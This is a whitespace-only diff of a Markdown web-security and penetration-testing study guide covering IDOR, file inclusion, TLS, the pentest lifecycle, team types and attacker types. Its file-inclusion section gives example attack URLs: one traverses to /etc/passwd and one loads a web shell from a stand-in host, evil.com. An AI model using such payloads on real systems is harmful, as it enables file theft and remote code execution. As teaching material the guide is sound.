@@ -381,18 +381,16 @@ These are flags set on **HTTP Cookies** to enhance security.
 **Consequences:**
 
 - Horizontal Privilege Escalation: Accessing same-level peers.
-    
+
 - Vertical Privilege Escalation: Accessing admin-level objects.
-    
 
 **Prevention:**
 
 - **Implement proper Access Control Checks:** Verify the authenticated user has permission to access the requested object on _every_ request.
-    
+
 - **Use indirect references:** Map direct IDs to random, unpredictable UUIDs or indirect reference maps.
-    
+
 - **Do not expose database keys** in URLs/APIs.
-    
 
 ---
 
@@ -401,29 +399,27 @@ These are flags set on **HTTP Cookies** to enhance security.
 **File Inclusion** vulnerabilities allow an attacker to include files on the server through the web browser.
 
 - **LFI (Local File Inclusion):** Includes files **already present** on the target server.
-    
-    - _Example:_ `http://site.com/page=../../../../etc/passwd`
-        
+
+- _Example:_ `http://site.com/page=../../../../etc/passwd`
+
 - **RFI (Remote File Inclusion):** Includes files from an **external remote server**. (Less common in modern PHP configs due to `allow_url_include=Off`).
-    
-    - _Example:_ `http://site.com/page=http://evil.com/shell.txt`
-        
+
+- _Example:_ `http://site.com/page=http://evil.com/shell.txt`    
 
 **Consequences:**
 
 - **LFI:** Reading sensitive files, log poisoning leading to RCE (Remote Code Execution).
-    
+
 - **RFI:** Direct Remote Code Execution (loading a web shell), Defacement, Data theft.
-    
+
 
 **Prevention:**
 
 - **Avoid dynamic file includes** based on user input.
-    
+
 - **Whitelist allowed files:** Use a static mapping (e.g., `page=1` maps to `home.php`).
-    
+
 - Disable dangerous PHP configurations (`allow_url_fopen`, `allow_url_include`).
-    
 
 ---
 
@@ -432,17 +428,16 @@ These are flags set on **HTTP Cookies** to enhance security.
 **Data in Transit** (moving between devices/networks) is secured via **Cryptography**.
 
 1. **TLS (Transport Layer Security):** The standard protocol (replaced SSL). Encrypts the communication channel between client and server.
-    
+
 2. **HTTPS:** HTTP over TLS (Port 443).
-    
+
 3. **Strong Ciphers:** Disable weak protocols (SSLv2, SSLv3, TLS 1.0/1.1), use TLS 1.2+.
-    
+
 4. **VPNs (IPsec, OpenVPN):** Encrypt entire network tunnels.
-    
+
 5. **SSH:** Secure remote administration.
-    
+
 6. **SFTP/FTPS:** Secure file transfer.
-    
 
 ---
 
@@ -451,45 +446,42 @@ These are flags set on **HTTP Cookies** to enhance security.
 ### 1. What are the phases in the penetration testing lifecycle?
 
 1. **Reconnaissance (Information Gathering):** Passive/Active gathering of intel.
-    
+
 2. **Scanning/Enumeration:** Using tools to scan ports, services, vulnerabilities (Nmap, Nessus).
-    
+
 3. **Gaining Access (Exploitation):** Executing exploits to compromise a system.
-    
+
 4. **Maintaining Access (Persistence):** Installing backdoors, rootkits (Scope defined; usually proof-of-concept only).
-    
+
 5. **Covering Tracks:** Clearing logs (Often not performed in standard commercial tests; more relevant for Red Teams).
-    
+
 6. **Reporting:** Documenting findings, risks, and remediation.
-    
 
 ---
 
 ### 2. What types of penetration testing assessments are there?
 
 - **Internal:** Simulating an attacker on the internal network (behind the firewall).
-    
+
 - **External:** Simulating an attacker on the internet; no initial access.
-    
+
 - **Web Application:** Focused on web apps, APIs.
-    
+
 - **Wireless:** Testing Wi-Fi networks (WPA2, WPA3, RADIUS).
-    
+
 - **Mobile:** iOS/Android application security.
-    
+
 - **Social Engineering:** Phishing campaigns, physical impersonation.
-    
+
 - **Physical:** Attempting to breach physical security (doors, tailgating).
-    
 
 ---
 
 ### 3. Difference between active and passive reconnaissance?
 
 - **Passive:** Gathering information without directly interacting with the target. The target has no way of knowing they were observed. (OSINT: Google dorking, WHOIS, social media, job postings).
-    
+
 - **Active:** Directly interacting with the target. (Port scanning, OS fingerprinting, visiting the website). **High risk of detection.**
-    
 
 ---
 
@@ -498,37 +490,34 @@ These are flags set on **HTTP Cookies** to enhance security.
 Primarily classified based on the amount of information provided to the tester:
 
 1. **Black Box (Zero Knowledge):** Tester has no prior knowledge. Simulates an external attacker.
-    
-2. **White Box (Full Knowledge):** Tester has full access to architecture diagrams, source code, credentials. Simulates an insider; allows for deeper, faster assessment.
-    
+
+2. **White Box (Full Knowledge):** Tester has full access to architecture diagrams, source code, credentials. Simulates an insider; allows for deeper, faster assessment.   
+
 3. **Grey Box (Partial Knowledge):** Hybrid model. Tester has some credentials or login access to the application. _Most common for web app pentests._
-    
 
 ---
 
 ### 5. What types of penetration testing teams are there and what are their responsibilities?
 
 - **Red Team:** Offensive. Simulates adversaries to test defenses. Goal: Achieve specific objectives (get flag, exfiltrate data). They emulate TTPs (Tactics, Techniques, Procedures).
-    
+
 - **Blue Team:** Defensive. Monitors, detects, and responds to intrusions (SOC, Incident Response).
-    
+
 - **Purple Team:** Collaboration. Red and Blue work together to maximize capability improvement via immediate feedback loops.
-    
 
 ---
 
 ### 6. What are some of the types of attackers?
 
 - **Script Kiddie:** Unskilled individuals using pre-made tools/scripts. Low sophistication.
-    
+
 - **APT (Advanced Persistent Threat):** Nation-state sponsored. Highly skilled, well-funded, stealthy, long-term objectives (espionage, sabotage).
-    
+
 - **Malicious Insider:** An employee, contractor, or trusted partner with internal access. Can be accidental or intentional.
-    
+
 - **Hacktivist:** Attacker motivated by political or social agendas (defacing websites, DDoS).
-    
+
 - **Cybercriminal:** Motivated by financial gain (ransomware, credit card theft).
-    
 
 ---
 
